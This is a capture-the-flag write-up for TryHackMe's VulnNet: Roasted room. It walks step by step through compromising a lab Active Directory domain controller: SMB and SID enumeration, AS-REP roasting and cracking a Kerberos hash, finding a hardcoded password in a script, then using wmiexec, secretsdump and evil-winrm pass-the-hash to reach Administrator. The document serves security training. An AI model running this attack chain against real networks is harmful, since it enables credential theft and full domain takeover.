# Tryhackme (writeup)
## VulnNet: Roasted



Link to room

https://tryhackme.com/room/vulnnetroasted

### Tasks

User.txt


System.txt

IP= 10.10.250.157
>## 1- Nmap
 ```
 root@ubuntu:~# nmap -sC -sV -Pn -n -A 10.10.250.157
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 19:04 UTC
Nmap scan report for 10.10.250.157
Host is up (0.12s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-16 18:05:54Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -59m23s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-16T18:06:09
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   130.36 ms 10.14.0.1
2   131.87 ms 10.10.250.157

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.84 seconds
```
We got this:

Domain: vulnnet-rst.local

Netbios name: WIN-2BO8M1OE1M1



>## 2-Enumerate SMB

 ```
 root@ubuntu:~# smbclient -L \\\\10.10.250.157
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
SMB1 disabled -- no workgroup available
```
>## Username enumerate
we will use lookupsid.py
```
root@ubuntu:~# lookupsid.py anonymous@10.10.250.157
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.250.157
[*] StringBinding ncacn_np:10.10.250.157[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)

```
we found some users,

let's create file with this users

>## GetNPUsers
```
root@ubuntu:~# GetNPUsers.py vulnnet-rst.local/ -usersfile users.txt -no-pass -dc-ip 10.10.250.157
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:85f4545ec4be97312a8824a26a0b9afa$010e2f219d16ea3af09d2da1d102[HIDEEN]
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
```

>## Crack Hashe
```
root@ubuntu:~# john  --wordlist=/root/THM/rockyou.txt hashe.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj07[HIDDEN]  ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
1g 0:00:00:02 DONE (2021-05-16 19:22) 0.3597g/s 1143Kp/s 1143Kc/s 1143KC/s tjalling..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Found T-skid's password

>## Smbclient
i tried smbclient with T-SKID and his password


```
root@ubuntu:~# smbclient  -U t-skid \\\\10.10.250.157\\NETLOGON
Enter WORKGROUP\t-skid's password:

```
 ````
 smb: \> ls
  .                                   D        0  Tue Mar 16 23:15:49 2021
  ..                                  D        0  Tue Mar 16 23:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 23:18:14 2021

		8771839 blocks of size 4096. 4534422 blocks available
smb: \> get ResetPassword.vbs
````

````

smb: \> get ResetPassword.vbs
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)
smb: \> 
````

````
root@ubuntu:~# cat ResetPassword.vbs 
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNd[HIDDEN]"

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")

````
I FOUND CREDENTIALS

>## wmiexec.py

using the new credeantials found
```
root@ubuntu:~# wmiexec.py vulnnet-rst.local/a-whitehat@10.10.116.57
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```
we got shell

let's find first task

user.txt

```
c:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 58D0-66AA

 Directory of c:\

03/11/2021  07:20 PM    <DIR>          PerfLogs
03/11/2021  08:36 AM    <DIR>          Program Files
03/11/2021  08:36 AM    <DIR>          Program Files (x86)
03/13/2021  04:42 PM    <DIR>          Users
03/12/2021  07:46 PM    <DIR>          VulnNet-Business-Anonymous
03/12/2021  07:46 PM    <DIR>          VulnNet-Enterprise-Anonymous
05/16/2021  11:33 AM    <DIR>          Windows
               0 File(s)              0 bytes
               7 Dir(s)  18,538,594,304 bytes free

c:\>cd Users
c:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 58D0-66AA

 Directory of c:\Users

03/13/2021  04:42 PM    <DIR>          .
03/13/2021  04:42 PM    <DIR>          ..
03/13/2021  04:20 PM    <DIR>          Administrator
03/13/2021  04:42 PM    <DIR>          enterprise-core-vn
03/11/2021  08:36 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  18,538,455,040 bytes free

c:\Users>cd enterprise-core-vn
c:\Users\enterprise-core-vn>dir
 Volume in drive C has no label.
 Volume Serial Number is 58D0-66AA

 Directory of c:\Users\enterprise-core-vn

03/13/2021  04:42 PM    <DIR>          .
03/13/2021  04:42 PM    <DIR>          ..
03/13/2021  04:43 PM    <DIR>          Desktop
03/13/2021  04:42 PM    <DIR>          Documents
09/15/2018  12:19 AM    <DIR>          Downloads
09/15/2018  12:19 AM    <DIR>          Favorites
09/15/2018  12:19 AM    <DIR>          Links
09/15/2018  12:19 AM    <DIR>          Music
09/15/2018  12:19 AM    <DIR>          Pictures
09/15/2018  12:19 AM    <DIR>          Saved Games
09/15/2018  12:19 AM    <DIR>          Videos
               0 File(s)              0 bytes
              11 Dir(s)  18,538,434,560 bytes free

c:\Users\enterprise-core-vn>cd Desktop
c:\Users\enterprise-core-vn\Desktop>dirt
'dirt' is not recognized as an internal or external command,
operable program or batch file.

c:\Users\enterprise-core-vn\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 58D0-66AA

 Directory of c:\Users\enterprise-core-vn\Desktop

03/13/2021  04:43 PM    <DIR>          .
03/13/2021  04:43 PM    <DIR>          ..
03/13/2021  04:43 PM                39 user.txt
               1 File(s)             39 bytes
               2 Dir(s)  18,538,307,584 bytes free

c:\Users\enterprise-core-vn\Desktop>more user.txt
THM{726b[HIDDEN]4ed}

````
 ## Privilege

Hashe Dump

DCSync attack

>## secretsdump.py

```
root@ubuntu:~# secretsdump.py vulnnet-rst.local/a-whitehat:******************@10.10.250.157
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eea[HIDDEN]9d:::
Guest:501:aad3b435b514040:::
DefaultAccount:503:aa5b51404ee:31d6cfe0d16ae931b73c59d7e0
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
```
## Login as Administrator with the hashe found

```
root@ubuntu:~# evil-winrm -i 10.10.250.157 -u Administrator -H c25[HIDDEN]c3b09d

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> cd c:\Users\Administrator\Desktop
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt


[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> more system.txt
THM{16[HIDDEN]7bf71d8d4c}

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> 
```
